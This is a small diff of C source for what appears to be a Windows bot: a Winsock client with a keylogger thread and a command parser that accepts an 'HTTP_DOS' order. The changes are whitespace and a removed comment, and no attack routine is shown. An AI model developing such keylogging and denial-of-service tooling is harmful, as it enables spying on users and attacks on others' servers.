@@ -15,9 +15,11 @@
 #include "utils.h"
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
+
 int expression_handler(char *command, char **token);
 void *kl_thread();
-int main(){
+
+int main() {
 	WSADATA wsa;                                        //Info about winsock implementation
 	SOCKET s;
 	pthread_t tid;
@@ -61,11 +63,9 @@ int expression_handler(char *command, char **riscommand){
 	//char *token;
 	int ris;
 
-	//Divido il comando ricevuto
 	token = strtok(command, delim);
 
 	if(strcmp("HTTP_DOS",token)==0){
-
         token = strtok(NULL,token);
         *riscommand=token;
 		return 1;
